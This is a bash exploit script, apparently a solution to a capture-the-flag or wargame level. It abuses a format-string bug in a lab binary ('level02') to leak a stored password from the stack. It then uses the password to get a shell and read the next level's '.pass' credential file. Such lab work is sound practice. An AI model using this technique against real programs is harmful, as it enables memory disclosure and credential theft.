#!/bin/bash

i="0"
flag=""

while [ $i -lt 100 ] && [ ${#flag} -ne 40 ]; do
    echo -e "%$i\$p\npassword" > /tmp/exploit02

    ptr=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
    ptr_decoded=`echo $ptr | xxd -r | rev 2>/dev/null`

    printf "%%%.2d\$p: %-20s | xxd -r | rev  =>  %s\n" $i "$ptr" "$ptr_decoded"

    # concatenate consecutives strings until 40 chars
    if [ ${#ptr_decoded} -gt 0 ]; then
        flag+="$ptr_decoded"
    else
        flag=""
    fi
    i=$[$i+1]
done

echo -e "\nIt should be:  $flag"

echo -e "\n$flag" > /tmp/exploit02

(cat /tmp/exploit02 - | ~/level02) > /tmp/output02 << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/users/level03/.pass)\n"
EOI

cat /tmp/output02